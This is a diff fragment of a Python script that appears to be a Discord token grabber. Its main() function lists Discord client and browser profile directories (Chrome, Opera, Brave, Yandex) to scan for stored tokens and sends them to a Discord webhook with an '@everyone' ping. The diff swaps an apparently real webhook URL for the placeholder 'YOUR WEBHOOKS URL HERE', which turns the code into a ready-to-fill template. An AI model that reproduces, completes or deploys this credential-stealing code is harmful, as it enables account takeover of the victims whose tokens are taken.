@@ -54,7 +54,7 @@ def find_codes(path):
 def main():
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
-    URL = 'https://discord.com/api/webhooks/957005034460184618/AaP7yT2uGE_3fef4J0HC0kFhBEHSKjdkLp0WtDLujkEk4WTDUVepv1soyfzwqibQBj8v'
+    URL = 'YOUR WEBHOOKS URL HERE'
     paths = {'Discord': roaming + '\\Discord', 'Discord Canary': roaming + '\\discordcanary', 'Discord PTB': roaming + '\\discordptb', 'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default', 'Opera': roaming + '\\Opera Software\\Opera Stable', 'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default', 'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'}
     message = '@everyone'
     for platform, path in paths.items():
